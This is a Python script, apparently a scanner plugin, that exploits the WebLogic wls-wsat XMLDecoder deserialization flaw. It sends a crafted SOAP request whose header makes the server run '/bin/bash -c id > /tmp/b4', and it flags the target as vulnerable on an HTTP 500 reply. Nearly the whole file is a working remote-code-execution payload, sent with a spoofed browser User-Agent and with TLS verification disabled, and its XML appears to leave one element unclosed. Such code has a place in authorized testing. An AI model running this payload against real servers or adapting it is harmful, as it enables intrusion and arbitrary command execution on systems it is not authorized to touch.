from typing import Optional

import requests


def run(url: str, port: int) -> Optional[str]:
    target_url = f"{url}:{port}/wls-wsat/CoordinatorPortType"
    headers = {
        "Content-Type": "text/xml;charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    xml = """
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
            <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                    <java version="1.4.0" class="java.beans.XMLDecoder">
                        <void class="java.lang.ProcessBuilder">
                            <array class="java.lang.String" length="3">
                                <void index="0">
                                    <string>/bin/bash</string>
                                </void>
                                <void index="1">
                                    <string>-c</string>
                                </void>
                                <void index="2">
                                    <string>id > /tmp/b4</string>
                                </void>
                            </array>
                            <void method="start"/>
                        </java>
                    </work:WorkContext>
                </soapenv:Header>
            <soapenv:Body/>
        </soapenv:Envelope>"""
    try:
        response = requests.post(
            target_url,
            headers=headers,
            data=xml,
            timeout=9,
            verify=False
        )
        if response.status_code == 500:
            return "WebLogic XMLDecoder Vulnerable"
        return None
    except Exception:
        return None
